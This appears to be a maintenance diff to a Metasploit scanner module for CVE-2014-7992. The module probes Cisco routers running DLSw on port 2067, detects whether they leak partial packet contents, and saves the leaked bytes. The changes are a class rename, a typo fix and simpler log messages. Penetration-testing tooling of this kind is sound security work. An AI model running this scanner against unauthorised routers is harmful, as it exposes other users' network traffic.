@@ -1,12 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'socket'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -17,7 +16,7 @@ class Metasploit3 < Msf::Auxiliary
       'Description'    => %q(
         This module implements the DLSw information disclosure retrieval. There
         is a bug in Cisco's DLSw implementation affecting 12.x and 15.x trains
-        that allows an unuthenticated remote attacker to retrieve the partial
+        that allows an unauthenticated remote attacker to retrieve the partial
         contents of packets traversing a Cisco router with DLSw configured
         and active.
       ),
@@ -39,11 +38,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(2067),
         OptInt.new('LEAK_AMOUNT', [true, 'The number of bytes to store before shutting down.', 1024])
-      ], self.class)
-  end
-
-  def peer
-    "#{rhost}:#{rport}"
+      ])
   end
 
   def get_response(size = 72)
@@ -55,14 +50,14 @@ class Metasploit3 < Msf::Auxiliary
 
   # Called when using check
   def check_host(_ip)
-    print_status("#{peer}: Checking for DLSw information disclosure (CVE-2014-7992)")
+    print_status("Checking for DLSw information disclosure (CVE-2014-7992)")
     response = get_response
 
     if response.blank?
-      vprint_status("#{peer}: no response")
+      vprint_status("No response")
       Exploit::CheckCode::Safe
     elsif response[0..1] == "\x31\x48" || response[0..1] == "\x32\x48"
-      vprint_good("#{peer}: Detected DLSw protocol")
+      vprint_good("Detected DLSw protocol")
       report_service(
         host: rhost,
         port: rport,
@@ -72,7 +67,7 @@ class Metasploit3 < Msf::Auxiliary
       # TODO: check that response has something that truly indicates it is vulnerable
       # and not simply that it responded
       unless response[18..72].scan(/\x00/).length == 54
-        print_good("#{peer}: vulnerable to DLSw information disclosure; leaked #{response.length} bytes")
+        print_good("Vulnerable to DLSw information disclosure; leaked #{response.length} bytes")
         report_vuln(
           host: rhost,
           port: rport,
@@ -83,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
         Exploit::CheckCode::Vulnerable
       end
     else
-      vprint_status("#{peer}: #{response.size}-byte response didn't contain any leaked data")
+      vprint_status("#{response.size}-byte response didn't contain any leaked data")
       Exploit::CheckCode::Safe
     end
   end
@@ -109,6 +104,6 @@ class Metasploit3 < Msf::Auxiliary
       'DLSw_leaked_data',
       'DLSw packet memory leak'
     )
-    print_status("#{peer}: DLSw leaked data stored in #{path}")
+    print_status("DLSw leaked data stored in #{path}")
   end
 end
